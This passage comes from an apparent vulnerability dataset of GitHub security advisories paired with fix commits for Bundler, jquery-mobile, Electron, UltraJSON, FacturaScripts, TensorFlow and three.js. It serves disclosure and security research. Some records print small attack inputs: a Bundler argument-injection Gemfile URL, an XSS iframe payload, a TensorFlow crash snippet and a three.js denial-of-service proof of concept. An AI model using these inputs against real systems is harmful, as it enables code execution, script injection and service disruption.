with a leading dash, this can be false.\n\nTo handle dependencies that come from a Git repository instead of a registry, Bundler uses various commands, such as `git clone`. These commands are being constructed using user input (e.g. the repository URL). When building the\ncommands, Bundler versions before 2.2.33 correctly avoid Command Injection vulnerabilities by passing an array of arguments instead of a command string. However, there is the possibility that a user input starts with a dash (`-`) and is therefore treated as an optional argument instead of a positional one. This can lead to Code Execution because some of the commands have options that can be leveraged to run arbitrary executables.\n\nSince this value comes from the `Gemfile` file, it can contain any character, including a leading dash.\n\n### Exploitation\n\nTo exploit this vulnerability, an attacker has to craft a directory containing a `Gemfile` file that declares a dependency that is located in a Git repository. This dependency has to have a Git URL in the form of `-u.\/payload`. This URL\nwill be used to construct a Git clone command but will be interpreted as the [upload-pack](https:\/\/git-scm.com\/docs\/git-clone#Documentation\/git-clone.txt--ultupload-packgt) argument. Then this directory needs to be shared with the victim, who then needs to run a command that evaluates the Gemfile, such as `bundle lock`, inside.\n\n### Impact\n\nThis vulnerability can lead to Arbitrary Code Execution, which could potentially lead to the takeover of the system. However, as explained above, the exploitability is very low, because it requires a lot of user interaction. It still could put developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make sure nothing can happen, e.g. by manually reviewing the `Gemfile` (although they would need the weird URL with a leading dash to not raise any flags).\n\nThis kind of attack vector [has been used in the past](https:\/\/www.cnbc.com\/2021\/01\/26\/north-korean-hackers-targeting-security-researchers-on-twitter.html) to target security researchers by sending them projects to collaborate on.\n\n### Patches\n\nBundler 2.2.33 has patched this problem by inserting `--` as an argument before any positional arguments to those Git commands that were affected by this issue.\n\n### Workarounds\n\nRegardless of whether users can upgrade or not, they should review any untrustred `Gemfile`'s before running any `bundler` commands that may read them, since they can contain arbitrary ruby code.\n\n### References\n\nhttps:\/\/cwe.mitre.org\/data\/definitions\/88.html","published_date":"2021-12-08","chain_len":2,"project":"https:\/\/github.com\/rubygems\/rubygems","commit_href":"https:\/\/github.com\/rubygems\/rubygems\/commit\/0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3","commit_sha":"0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3","patch":"MULTI","chain_ord":"['a4f2f8ac17e6ce81c689527a8b6f14381060d95f', '0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3']","before_first_fix_commit":"{'6a655a698e952f897d0d014fc11bae4b608528ce'}","last_fix_commit":"0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3","chain_ord_pos":2.0,"commit_datetime":"12\/07\/2021, 14:34:48","message":"Changelog for Bundler version 2.2.33","author":"David Rodr\u00edguez","comments":null,"stats":"{'additions': 29, 'deletions': 0, 'total': 29}","files":"{'bundler\/CHANGELOG.md': {'additions': 29, 'deletions': 0, 'changes': 29, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rubygems\/rubygems\/raw\/0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3\/bundler%2FCHANGELOG.md', 'patch': '@@ -1,3 +1,32 @@\\n+# 2.2.33 (December 7, 2021)\\n+\\n+## Security fixes:\\n+\\n+  - Pass \"--\" to git commands to separate positional and optional args [#5142](https:\/\/github.com\/rubygems\/rubygems\/pull\/5142)\\n+\\n+## Enhancements:\\n+\\n+  - Accept pull request URLs as github source [#5126](https:\/\/github.com\/rubygems\/rubygems\/pull\/5126)\\n+  - Add `--version` parameter to `bundle info` command [#5137](https:\/\/github.com\/rubygems\/rubygems\/pull\/5137)\\n+  - Let original `Errno::EACCES` error be raised in compact index updater [#5110](https:\/\/github.com\/rubygems\/rubygems\/pull\/5110)\\n+  - Improve gemfile-lockfile source equivalence errors [#5120](https:\/\/github.com\/rubygems\/rubygems\/pull\/5120)\\n+  - Avoid float-to-string loss of characters in GitHub Actions configuration labels in new gem template [#5089](https:\/\/github.com\/rubygems\/rubygems\/pull\/5089)\\n+  - Add an initial rbs template to `bundle gem` skeleton [#5041](https:\/\/github.com\/rubygems\/rubygems\/pull\/5041)\\n+  - Avoid shared libraries not getting environment passed right after argv in memory when `bundle exec` is used [#4815](https:\/\/github.com\/rubygems\/rubygems\/pull\/4815)\\n+\\n+## Bug fixes:\\n+\\n+  - Don\\'t cleanup paths from gems already activated from `$LOAD_PATH` [#5111](https:\/\/github.com\/rubygems\/rubygems\/pull\/5111)\\n+  - Fix handling prereleases of 0 versions, like 0.0.0.dev or 0.0.0.SNAPSHOT [#5116](https:\/\/github.com\/rubygems\/rubygems\/pull\/5116)\\n+  - Fix escape of filenames in `bundle doctor` [#5102](https:\/\/github.com\/rubygems\/rubygems\/pull\/5102)\\n+  - Don\\'t unlock dependencies when running `bundle install` after changing global source [#5090](https:\/\/github.com\/rubygems\/rubygems\/pull\/5090)\\n+  - Fix missing locked specs when depended on another platform [#5092](https:\/\/github.com\/rubygems\/rubygems\/pull\/5092)\\n+  - Fix `bundle info` sometimes claiming that bundler has been deleted [#5097](https:\/\/github.com\/rubygems\/rubygems\/pull\/5097)\\n+\\n+## Documentation:\\n+\\n+  - Ignore to generate the documentation from vendored libraries [#5118](https:\/\/github.com\/rubygems\/rubygems\/pull\/5118)\\n+\\n # 2.2.32 (November 23, 2021)\\n \\n ## Enhancements:'}}","message_norm":"changelog for bundler version 2.2.33","language":"da","entities":"[('changelog', 'ACTION', ''), ('2.2.33', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundler\/CHANGELOG.md'])","num_files":1.0},{"index":1742,"vuln_id":"GHSA-fj93-7wm4-8x2g","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/jquery\/jquery-mobile\/commit\/b0d9cc758a48f13321750d7409fb7655dcdf2b50'}","dataset":"osv","summary":"Cross-Site Scripting in jquery-mobile All version of `jquery-mobile` are vulnerable to Cross-Site Scripting. The package checks for content in `location.hash` and if a URL is found it does an XmlHttpRequest (XHR) to the URL and renders the response with `innerHTML`. It fails to validate the `Content-Type` of the response, allowing attackers to include malicious payloads as part of query parameters that are reflected back to the user. A response such as `{\"q\":\"<iframe\/src='javascript:alert(1)'><\/iframe>\",\"results\":[]}` would be parsed as HTML and the JavaScript payload executed.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.","published_date":"2020-09-02","chain_len":1,"project":"https:\/\/github.com\/jquery\/jquery-mobile","commit_href":"https:\/\/github.com\/jquery\/jquery-mobile\/commit\/b0d9cc758a48f13321750d7409fb7655dcdf2b50","commit_sha":"b0d9cc758a48f13321750d7409fb7655dcdf2b50","patch":"SINGLE","chain_ord":"['b0d9cc758a48f13321750d7409fb7655dcdf2b50']","before_first_fix_commit":"{'1f0cec9bcb9d75998e733d580d6f1144c963326e'}","last_fix_commit":"b0d9cc758a48f13321750d7409fb7655dcdf2b50","chain_ord_pos":1.0,"commit_datetime":"06\/13\/2019, 17:42:26","message":"Check Content-Type header before parsing AJAX response as HTML (#8649)\n\nFix for issue #8640 (possible XSS vulnerability)","author":"Denis Ryabov","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'js\/widgets\/pagecontainer.js': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jquery-archive\/jquery-mobile\/raw\/b0d9cc758a48f13321750d7409fb7655dcdf2b50\/js%2Fwidgets%2Fpagecontainer.js', 'patch': '@@ -564,6 +564,15 @@ $.widget( \"mobile.pagecontainer\", {\\n \\n \\t\\treturn $.proxy( function( html, textStatus, xhr ) {\\n \\n+\\t\\t\\t\/\/ Check that Content-Type is \"text\/html\" (https:\/\/github.com\/jquery\/jquery-mobile\/issues\/8640)\\n+\\t\\t\\tif ( !\/^text\\\\\/html\\\\b\/.test( xhr.getResponseHeader(\\'Content-Type\\') ) ) {\\n+\\t\\t\\t\\t\/\/ Display error message for unsupported content type\\n+\\t\\t\\t\\tif ( settings.showLoadMsg ) {\\n+\\t\\t\\t\\t\\tthis._showError();\\n+\\t\\t\\t\\t}\\n+\\t\\t\\t\\treturn;\\n+\\t\\t\\t}\\n+\\n \\t\\t\\t\/\/ Pre-parse html to check for a data-url, use it as the new fileUrl, base path, etc\\n \\t\\t\\tvar content,'}}","message_norm":"check content-type header before parsing ajax response as html (#8649)\n\nfix for issue #8640 (possible xss vulnerability)","language":"en","entities":"[('#8649', 'ISSUE', ''), ('issue', 'FLAW', ''), ('#8640', 'ISSUE', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['js\/widgets\/pagecontainer.js'])","num_files":1.0},{"index":1745,"vuln_id":"GHSA-fjqr-fx3f-g4rv","cwe_id":"{'CWE-78'}","score":8.8,"chain":"{'https:\/\/github.com\/electron\/electron\/commit\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7'}","dataset":"osv","summary":"Electron protocol handler browser vulnerable to Command Injection Github Electron version Electron 1.8.2-beta.4 and earlier contains a Command Injection vulnerability in Protocol Handler that can result in command execute. This attack appear to be exploitable via the victim opening an electron protocol handler in their browser. This vulnerability appears to have been fixed in Electron 1.8.2-beta.5. This issue is due to an incomplete fix for CVE-2018-1000006, specifically the black list used was not case insensitive allowing an attacker to potentially bypass it.","published_date":"2018-03-26","chain_len":1,"project":"https:\/\/github.com\/electron\/electron","commit_href":"https:\/\/github.com\/electron\/electron\/commit\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7","commit_sha":"ce361a12e355f9e1e99c989f1ea056c9e502dbe7","patch":"SINGLE","chain_ord":"['ce361a12e355f9e1e99c989f1ea056c9e502dbe7']","before_first_fix_commit":"{'278c58055ed36f6f22cea05a9cd85a5ab4fb3010'}","last_fix_commit":"ce361a12e355f9e1e99c989f1ea056c9e502dbe7","chain_ord_pos":1.0,"commit_datetime":"02\/01\/2018, 00:35:09","message":"Use case-insensitive switch comparisons","author":"Samuel Attard","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'atom\/app\/command_line_args.cc': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/electron\/electron\/raw\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7\/atom%2Fapp%2Fcommand_line_args.cc', 'patch': '@@ -1390,7 +1390,8 @@ bool IsBlacklistedArg(const base::CommandLine::CharType* arg) {\\n \\n   if (prefix_length > 0) {\\n     a += prefix_length;\\n-    std::string switch_name(a, strcspn(a, \"=\"));\\n+    std::string switch_name =\\n+        base::ToLowerASCII(base::StringPiece(a, strcspn(a, \"=\")));\\n     auto* iter = std::lower_bound(std::begin(kBlacklist), std::end(kBlacklist),\\n                                   switch_name);\\n     if (iter != std::end(kBlacklist) && switch_name == *iter) {'}}","message_norm":"use case-insensitive switch comparisons","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['atom\/app\/command_line_args.cc'])","num_files":1.0},{"index":1746,"vuln_id":"GHSA-fm67-cv37-96ff","cwe_id":"{'CWE-415'}","score":5.9,"chain":"{'https:\/\/github.com\/ultrajson\/ultrajson\/commit\/9c20de0f77b391093967e25d01fb48671104b15b'}","dataset":"osv","summary":"Potential double free of buffer during string decoding ### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nWhen an error occurs while reallocating the buffer for string decoding, the buffer gets freed twice.\n\nDue to how UltraJSON uses the internal decoder, this double free is impossible to trigger from Python.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nUsers should upgrade to UltraJSON 5.4.0.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThere is no workaround.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [UltraJSON](http:\/\/github.com\/ultrajson\/ultrajson\/issues)","published_date":"2022-07-05","chain_len":1,"project":"https:\/\/github.com\/ultrajson\/ultrajson","commit_href":"https:\/\/github.com\/ultrajson\/ultrajson\/commit\/9c20de0f77b391093967e25d01fb48671104b15b","commit_sha":"9c20de0f77b391093967e25d01fb48671104b15b","patch":"SINGLE","chain_ord":"['9c20de0f77b391093967e25d01fb48671104b15b']","before_first_fix_commit":"{'b21da40ead640b6153783dad506e68b4024056ef', '67ec07183342589d602e0fcf7bb1ff3e19272687'}","last_fix_commit":"9c20de0f77b391093967e25d01fb48671104b15b","chain_ord_pos":1.0,"commit_datetime":"07\/02\/2022, 05:11:59","message":"Merge pull request from GHSA-fm67-cv37-96ff\n\nFix double free on string decoding if realloc fails","author":"Hugo van Kemenade","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/ultrajsondec.c': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ultrajson\/ultrajson\/raw\/9c20de0f77b391093967e25d01fb48671104b15b\/lib%2Fultrajsondec.c', 'patch': '@@ -384,7 +384,7 @@ static FASTCALL_ATTR JSOBJ FASTCALL_MSVC decode_string ( struct DecoderState *ds\\n       escStart = (JSUINT32 *)ds->dec->realloc(ds->escStart, newSize * sizeof(JSUINT32));\\n       if (!escStart)\\n       {\\n-        ds->dec->free(ds->escStart);\\n+        \/\/ Don\\'t free ds->escStart here; it gets handled in JSON_DecodeObject.\\n         return SetError(ds, -1, \"Could not reserve memory block\");\\n       }\\n       ds->escStart = escStart;'}}","message_norm":"merge pull request from ghsa-fm67-cv37-96ff\n\nfix double free on string decoding if realloc fails","language":"en","entities":"[('ghsa-fm67-cv37-96ff', 'VULNID', 'GHSA'), ('double free', 'SECWORD', ''), ('decoding', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ultrajsondec.c'])","num_files":1.0},{"index":1753,"vuln_id":"GHSA-fp76-f299-v3hj","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/neorazorx\/facturascripts\/commit\/1d1edb40b40016d7fd2893b410b98569d7facca1'}","dataset":"osv","summary":"Cross-site Scripting in FacturaScripts Cross-site Scripting (XSS) - Stored in GitHub repository neorazorx\/facturascripts prior to 2022.06.","published_date":"2022-06-14","chain_len":1,"project":"https:\/\/github.com\/neorazorx\/facturascripts","commit_href":"https:\/\/github.com\/neorazorx\/facturascripts\/commit\/1d1edb40b40016d7fd2893b410b98569d7facca1","commit_sha":"1d1edb40b40016d7fd2893b410b98569d7facca1","patch":"SINGLE","chain_ord":"['1d1edb40b40016d7fd2893b410b98569d7facca1']","before_first_fix_commit":"{'73a6595ca85984d65f656c6356fabb23d1936c54'}","last_fix_commit":"1d1edb40b40016d7fd2893b410b98569d7facca1","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 09:55:32","message":"Force to download SVG files to prevent security problems.\n------\nForzamos a descargar los archivos SVG para evitar problemas de seguridad.","author":"Carlos Garcia Gomez","comments":null,"stats":"{'additions': 19, 'deletions': 10, 'total': 29}","files":"{'Core\/App\/AppRouter.php': {'additions': 19, 'deletions': 10, 'changes': 29, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NeoRazorX\/facturascripts\/raw\/1d1edb40b40016d7fd2893b410b98569d7facca1\/Core%2FApp%2FAppRouter.php', 'patch': '@@ -127,8 +127,7 @@ public function getFile(): bool\\n         $allowedFolders = [\\'node_modules\\', \\'vendor\\', \\'Dinamic\\', \\'Core\\', \\'Plugins\\', \\'MyFiles\/Public\\'];\\n         foreach ($allowedFolders as $folder) {\\n             if (\\'\/\\' . $folder === substr($uri, 0, 1 + strlen($folder))) {\\n-                header(\\'Content-Type: \\' . $this->getMime($filePath));\\n-                readfile($filePath);\\n+                $this->download($filePath);\\n                 return true;\\n             }\\n         }\\n@@ -137,14 +136,7 @@ public function getFile(): bool\\n         $token = filter_input(INPUT_GET, \\'myft\\');\\n         $fixedFilePath = substr(urldecode($uri), 1);\\n         if (\\'\/MyFiles\/\\' === substr($uri, 0, 9) && $token && MyFilesToken::validate($fixedFilePath, $token)) {\\n-            header(\\'Content-Type: \\' . $this->getMime($filePath));\\n-\\n-            \/\/ disable the buffer if enabled\\n-            if (ob_get_contents()) {\\n-                ob_end_flush();\\n-            }\\n-\\n-            readfile($filePath);\\n+            $this->download($filePath);\\n             return true;\\n         }\\n \\n@@ -205,6 +197,23 @@ private function deploy()\\n         }\\n     }\\n \\n+    private function download(string $filePath)\\n+    {\\n+        header(\\'Content-Type: \\' . $this->getMime($filePath));\\n+\\n+        \/\/ disable the buffer if enabled\\n+        if (ob_get_contents()) {\\n+            ob_end_flush();\\n+        }\\n+\\n+        \/\/ force to download svg files to prevent XSS attacks\\n+        if (strpos($filePath, \\'.svg\\') !== false) {\\n+            header(\\'Content-Disposition: attachment; filename=\"\\' . basename($filePath) . \\'\"\\');\\n+        }\\n+\\n+        readfile($filePath);\\n+    }\\n+\\n     \/**\\n      * Return the mime type from given file.\\n      *'}}","message_norm":"force to download svg files to prevent security problems.\n------\nforzamos a descargar los archivos svg para evitar problemas de seguridad.","language":"es","entities":"[('prevent', 'ACTION', ''), ('security', 'SECWORD', ''), ('problems', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Core\/App\/AppRouter.php'])","num_files":1.0},{"index":1754,"vuln_id":"GHSA-fpcp-9h7m-ffpx","cwe_id":"{'CWE-476'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e21af685e1828f7ca65038307df5cc06de4479e8'}","dataset":"osv","summary":"Null pointer dereference in TensorFlow  ### Impact\nWhen [building an XLA compilation cache](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/274df9b02330b790aa8de1cee164b70f72b9b244\/tensorflow\/compiler\/jit\/xla_platform_info.cc#L43-L104), if default settings are used, TensorFlow triggers a null pointer dereference:\n\n```cc \n  string allowed_gpus =\n      flr->config_proto()->gpu_options().visible_device_list();\n``` \n    \nIn the default scenario, all devices are allowed, so `flr->config_proto` is `nullptr`.\n    \n### Patches\nWe have patched the issue in GitHub commit [e21af685e1828f7ca65038307df5cc06de4479e8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e21af685e1828f7ca65038307df5cc06de4479e8).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e21af685e1828f7ca65038307df5cc06de4479e8","commit_sha":"e21af685e1828f7ca65038307df5cc06de4479e8","patch":"SINGLE","chain_ord":"['e21af685e1828f7ca65038307df5cc06de4479e8']","before_first_fix_commit":"{'30f8e5c460629a9f8dbb04dc562c7b579c07f11b'}","last_fix_commit":"e21af685e1828f7ca65038307df5cc06de4479e8","chain_ord_pos":1.0,"commit_datetime":"01\/08\/2022, 00:20:27","message":"Fix Null-pointer dereference in BuildXlaCompilationCache\n\nIf ConfigProto is not used, then use the default settings which is to allow all devices.\n\nPiperOrigin-RevId: 420391800\nChange-Id: I88161ad7042990aef678e77b597a2fb2c8f815be","author":"Smit Hinsu","comments":null,"stats":"{'additions': 7, 'deletions': 5, 'total': 12}","files":"{'tensorflow\/compiler\/jit\/xla_platform_info.cc': {'additions': 7, 'deletions': 5, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e21af685e1828f7ca65038307df5cc06de4479e8\/tensorflow%2Fcompiler%2Fjit%2Fxla_platform_info.cc', 'patch': '@@ -82,11 +82,13 @@ Status BuildXlaCompilationCache(DeviceBase* device, FunctionLibraryRuntime* flr,\\n   client_options.set_intra_op_parallelism_threads(\\n       device->tensorflow_cpu_worker_threads()->num_threads);\\n \\n-  string allowed_gpus =\\n-      flr->config_proto()->gpu_options().visible_device_list();\\n-  TF_ASSIGN_OR_RETURN(absl::optional<std::set<int>> gpu_ids,\\n-                      ParseVisibleDeviceList(allowed_gpus));\\n-  client_options.set_allowed_devices(gpu_ids);\\n+  if (flr->config_proto()) {\\n+    string allowed_gpus =\\n+        flr->config_proto()->gpu_options().visible_device_list();\\n+    TF_ASSIGN_OR_RETURN(absl::optional<std::set<int>> gpu_ids,\\n+                        ParseVisibleDeviceList(allowed_gpus));\\n+    client_options.set_allowed_devices(gpu_ids);\\n+  }\\n \\n   auto client = xla::ClientLibrary::GetOrCreateLocalClient(client_options);\\n   if (!client.ok()) {'}}","message_norm":"fix null-pointer dereference in buildxlacompilationcache\n\nif configproto is not used, then use the default settings which is to allow all devices.\n\npiperorigin-revid: 420391800\nchange-id: i88161ad7042990aef678e77b597a2fb2c8f815be","language":"en","entities":"[('fix', 'ACTION', ''), ('null-pointer dereference', 'SECWORD', ''), ('420391800', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/compiler\/jit\/xla_platform_info.cc'])","num_files":1.0},{"index":1755,"vuln_id":"GHSA-fphq-gw9m-ghrv","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2'}","dataset":"osv","summary":"CHECK-fail in `CTCGreedyDecoder` ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.CTCGreedyDecoder`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)\nsequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)\nmerge_repeated = False\n\ntf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)\n```\n  \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/1615440b17b364b875eb06f43d087381f1460a65\/tensorflow\/core\/kernels\/ctc_decoder_ops.cc#L37-L50) has a `CHECK_LT` inserted to validate some invariants. When this condition is false, the program aborts, instead of returning a valid error to the user. This abnormal termination can be weaponized in denial of service attacks.\n\n### Patches \nWe have patched the issue in GitHub commit [ea3b43e98c32c97b35d52b4c66f9107452ca8fb2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n                      \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.        \n                      \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2","commit_sha":"ea3b43e98c32c97b35d52b4c66f9107452ca8fb2","patch":"SINGLE","chain_ord":"['ea3b43e98c32c97b35d52b4c66f9107452ca8fb2']","before_first_fix_commit":"{'1615440b17b364b875eb06f43d087381f1460a65'}","last_fix_commit":"ea3b43e98c32c97b35d52b4c66f9107452ca8fb2","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2021, 22:11:05","message":"Fix `tf.raw_ops.CTCGreedyDecoder` CHECK failure.\n\nPiperOrigin-RevId: 369960465\nChange-Id: If0b8b3264d5a47a24ac0970ed7b81ce6b4921fae","author":"Amit Patankar","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/ctc_decoder_ops.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2\/tensorflow%2Fcore%2Fkernels%2Fctc_decoder_ops.cc', 'patch': '@@ -232,6 +232,8 @@ class CTCGreedyDecoderOp : public OpKernel {\\n         int prev_indices = -1;\\n         for (int t = 0; t < seq_len_t(b); ++t) {\\n           int max_class_indices;\\n+          OP_REQUIRES(ctx, input_list_t[t].dimension(1) > 0,\\n+                      errors::InvalidArgument(\"Invalid input dimensions.\"));\\n           log_prob_t(b, 0) +=\\n               -RowMax<T>(input_list_t[t], b, &max_class_indices);\\n           if (max_class_indices != blank_index &&'}}","message_norm":"fix `tf.raw_ops.ctcgreedydecoder` check failure.\n\npiperorigin-revid: 369960465\nchange-id: if0b8b3264d5a47a24ac0970ed7b81ce6b4921fae","language":"en","entities":"[('fix', 'ACTION', ''), ('tf.raw_ops.ctcgreedydecoder', 'SECWORD', ''), ('369960465', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ctc_decoder_ops.cc'])","num_files":1.0},{"index":1761,"vuln_id":"GHSA-fq6p-6334-8gr4","cwe_id":"{'CWE-401'}","score":4.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ab51e5b813573dc9f51efa335aebcf2994125ee9'}","dataset":"osv","summary":"Memory leak in decoding PNG images ### Impact\nWhen [decoding PNG images](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/kernels\/image\/decode_image_op.cc#L322-L416) TensorFlow can produce a memory leak if the image is invalid.\nAfter calling `png::CommonInitDecode(..., &decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(&decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur.\n  \n### Patches   \nWe have patched the issue in GitHub commit [ab51e5b813573dc9f51efa335aebcf2994125ee9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ab51e5b813573dc9f51efa335aebcf2994125ee9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ab51e5b813573dc9f51efa335aebcf2994125ee9","commit_sha":"ab51e5b813573dc9f51efa335aebcf2994125ee9","patch":"SINGLE","chain_ord":"['ab51e5b813573dc9f51efa335aebcf2994125ee9']","before_first_fix_commit":"{'fb5ce99505358985ace9e811fd25a57047471d6f'}","last_fix_commit":"ab51e5b813573dc9f51efa335aebcf2994125ee9","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 03:24:32","message":"Prevent memory leak in decoding PNG images.\n\nPiperOrigin-RevId: 409300653\nChange-Id: I6182124c545989cef80cefd439b659095920763b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/image\/decode_image_op.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ab51e5b813573dc9f51efa335aebcf2994125ee9\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdecode_image_op.cc', 'patch': '@@ -18,6 +18,8 @@ limitations under the License.\\n #include <cstdint>\\n #include <memory>\\n \\n+#include \"tensorflow\/core\/lib\/gtl\/cleanup.h\"\\n+\\n #define EIGEN_USE_THREADS\\n \\n #include \"absl\/strings\/escaping.h\"\\n@@ -326,6 +328,16 @@ class DecodeImageV2Op : public OpKernel {\\n         context, png::CommonInitDecode(input, channels_, channel_bits, &decode),\\n         errors::InvalidArgument(\"Invalid PNG. Failed to initialize decoder.\"));\\n \\n+    \/\/ If we reach this point, then there is data in `decode` which must be\\n+    \/\/ freed by the time we end execution in this function. We cannot call\\n+    \/\/ `png::CommonFreeDecode()` before an `OP_REQUIRES` because if\\n+    \/\/ `OP_REQUIRES` constraint is satisfied then the data would be freed\\n+    \/\/ prematurely. Instead, let\\'s use a `Cleanup` object.\\n+    auto cleanup = gtl::MakeCleanup([&decode]() {\\n+      std::cerr << \"Cleanup called...\\\\n\";\\n+      png::CommonFreeDecode(&decode);\\n+    });\\n+\\n     \/\/ Verify that width and height are not too large:\\n     \/\/ - verify width and height don\\'t overflow int.\\n     \/\/ - width can later be multiplied by channels_ and sizeof(uint16), so'}}","message_norm":"prevent memory leak in decoding png images.\n\npiperorigin-revid: 409300653\nchange-id: i6182124c545989cef80cefd439b659095920763b","language":"en","entities":"[('prevent', 'ACTION', ''), ('memory leak', 'SECWORD', ''), ('decoding', 'SECWORD', ''), ('409300653', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/decode_image_op.cc'])","num_files":1.0},{"index":1762,"vuln_id":"GHSA-fq6p-x6j3-cmmq","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/mrdoob\/three.js\/pull\/21143\/commits\/4a582355216b620176a291ff319d740e619d583e'}","dataset":"osv","summary":"Denial of service in three This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. PoC: var three = require('three') function build_blank (n) { var ret = \"rgb(\" for (var i = 0; i < n; i++) { ret += \" \" } return ret + \"\"; } var Color = three.Color var time = Date.now(); new Color(build_blank(50000)) var time_cost = Date.now() - time; console.log(time_cost+\" 